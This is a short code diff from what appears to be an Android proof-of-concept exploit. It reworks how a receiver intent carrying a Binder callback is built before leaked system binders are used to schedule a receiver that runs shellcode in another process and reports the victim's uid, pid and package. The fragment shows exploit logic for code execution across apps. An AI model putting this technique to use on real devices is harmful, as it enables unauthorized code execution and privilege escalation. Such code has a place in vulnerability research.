@@ -105,13 +105,27 @@ public class MainActivity extends AppCompatActivity {
 
             log("Requesting code execution");
             Intent intent = new Intent(this, ShellcodeReceiver.class);
-            MiscUtils.putBinderExtra(intent, "a", new IShellcodeReporter.Stub() {
+            Bundle bundle = new Bundle();
+
+            bundle.putBinder("a", new IShellcodeReporter.Stub() {
                 @Override
                 public void noteShellcodeExecuted(String packageName, String id) {
                     log("Shellcode has been executed in uid=" + Binder.getCallingUid() + " pid=" + Binder.getCallingPid() + " packageName=" + packageName);
                     log(id);
                 }
             });
+
+            String dataDir = getApplicationInfo().dataDir;
+            bundle.putString("data", dataDir);
+            intent.putExtras(bundle);
+            // MiscUtils.putBinderExtra(intent, "a", new IShellcodeReporter.Stub() {
+            //     @Override
+            //     public void noteShellcodeExecuted(String packageName, String id) {
+            //         log("Shellcode has been executed in uid=" + Binder.getCallingUid() + " pid=" + Binder.getCallingPid() + " packageName=" + packageName);
+            //         log(id);
+            //     }
+            // });
+
             for (IBinder leakedBinder : leakedBinders) {
                 try {
                     MiscUtils.callScheduleReceiver(
